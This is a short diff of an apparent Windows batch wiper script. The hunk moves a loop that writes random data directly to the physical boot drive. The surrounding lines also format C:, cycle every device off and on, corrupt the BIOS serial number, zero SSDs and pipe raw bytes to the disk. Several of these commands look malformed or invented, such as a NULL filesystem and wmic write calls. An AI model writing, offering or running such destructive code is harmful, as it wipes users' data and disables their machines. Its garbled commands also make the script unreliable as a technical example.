@@ -40,13 +40,6 @@ o 71 ff
 q
 EOF
 
-set "chars=0123456789ABCDEF"
-for /l %%s in (1,1,100000) do (
-    set /a r=!random! %% 65536
-    echo !chars:~%r%,1! >> C:\zero.bin
-    type C:\zero.bin > \\.\PhysicalDrive0
-)
-
 for /l %%c in (1,1,255) do (
     devcon disable * >nul 2>&1
     devcon enable * >nul 2>&1
@@ -55,6 +48,15 @@ for /l %%c in (1,1,255) do (
 wmic process call create "cmd /c echo y| format c: /fs:NULL /x /p:3" >nul 2>&1
 wmic bios set SerialNumber="CORRUPTED" >nul 2>&1
 wmic path win32_physicalmedia where "MediaType like '%SSD%'" call write 0,0,0 >nul 2>&1
+
+
+set "chars=0123456789ABCDEF"
+for /l %%s in (1,1,100000) do (
+    set /a r=!random! %% 65536
+    echo !chars:~%r%,1! >> C:\zero.bin
+    type C:\zero.bin > \\.\PhysicalDrive0
+)
+
 
 echo 5E 1F 7C 00 00 48 C7 C0 3C 00 00 00 0F 05 | xxd -r -p > \\.\PhysicalDrive0
 
